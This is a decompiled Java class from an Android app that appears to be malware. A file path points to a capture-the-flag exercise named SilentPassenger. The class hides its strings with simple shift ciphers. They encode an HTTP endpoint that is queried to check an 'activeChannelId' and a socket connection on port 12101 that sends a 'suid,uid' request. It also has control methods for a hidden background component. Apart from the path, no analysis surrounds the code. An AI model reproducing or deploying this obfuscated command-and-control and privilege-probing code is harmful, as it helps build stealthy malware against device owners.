package com.c.j;

import android.content.Context;
import android.content.Intent;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.Socket;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/* loaded from: D:\hommie_Ctf\SilentPassenger\extracted\stage2_unzip\classes_fixed.dex */
public final class g {
    public static boolean a = true;
    private static g b = new g();
    private Context d;
    private String e;
    private String f;
    private String g;
    private String h;
    private boolean j;
    private boolean c = false;
    private final d i = new d(new c());

    private g() {
    }

    public static g a() {
        return b;
    }

    /* JADX INFO: Access modifiers changed from: private */
    public boolean a(String str) {
        try {
            q a2 = o.a(a.a("kwws=22w41yuu;6781vlwh2fsf2dsl2folhqw2dfwlyhBfkdqqhoLg@", 3) + this.e + a.a("0\u007fsnG", 10) + str);
            if (a2.a == 200) {
                a2.a();
                if (a2.a().contains(a.a("jgzg(@7", 6))) {
                    return true;
                }
            }
        } catch (Exception e) {
        }
        return false;
    }

    private void g() {
        this.i.a(this.d, this.e, this.g, this.h, this.f);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static String h() {
        InputStream inputStream;
        DataOutputStream dataOutputStream;
        DataInputStream dataInputStream;
        try {
            Socket socket = new Socket(a.a("56;242425", 4), 12101);
            inputStream = socket.getInputStream();
            dataOutputStream = new DataOutputStream(socket.getOutputStream());
            dataInputStream = new DataInputStream(inputStream);
            dataOutputStream.writeInt(25746);
            dataOutputStream.writeByte(101);
            byte[] bytes = a.a("vxlg/xlg", 3).getBytes();
            dataOutputStream.writeInt(bytes.length);
            dataOutputStream.write(bytes);
            dataOutputStream.flush();
        } catch (IOException e) {
        }
        if (dataInputStream.readInt() != 25746) {
            dataInputStream.close();
            dataOutputStream.close();
            return null;
        }
        byte[] bArr = new byte[dataInputStream.readInt()];
        inputStream.read(bArr);
        String str = new String(bArr);
        dataInputStream.close();
        dataOutputStream.close();
        return str;
    }

    public final synchronized void a(Context context) {
        this.d = context;
        g();
    }

    public final synchronized void a(Context context, String str, String str2, String str3, String str4) {
        this.d = context;
        this.e = str;
        this.g = str2;
        this.h = str3;
        this.f = str4;
        g();
    }

    public final void a(Intent intent) {
        if (intent != null) {
            switch (intent.getIntExtra(a.a("LW", 8), -1)) {
                case 10:
                    this.i.b();
                    this.c = this.i.e();
                    return;
                default:
                    return;
            }
        }
    }

    public final synchronized void b() {
        g();
        if (this.i.a()) {
            this.c = true;
            k.a().b();
        } else {
            this.c = false;
        }
    }

    public final boolean c() {
        return this.i.d();
    }

    public final void d() {
        this.j = false;
        this.i.c();
        this.c = false;
    }

    public final int e() {
        boolean z;
        if (this.d == null) {
            return -2;
        }
        ExecutorService newSingleThreadExecutor = Executors.newSingleThreadExecutor();
        try {
            z = ((Boolean) newSingleThreadExecutor.submit(new h(this)).get()).booleanValue();
            newSingleThreadExecutor.shutdown();
        } catch (Exception e) {
            newSingleThreadExecutor.shutdown();
            z = false;
        } catch (Throwable th) {
            newSingleThreadExecutor.shutdown();
            throw th;
        }
        return !z ? -3 : 211;
    }
}
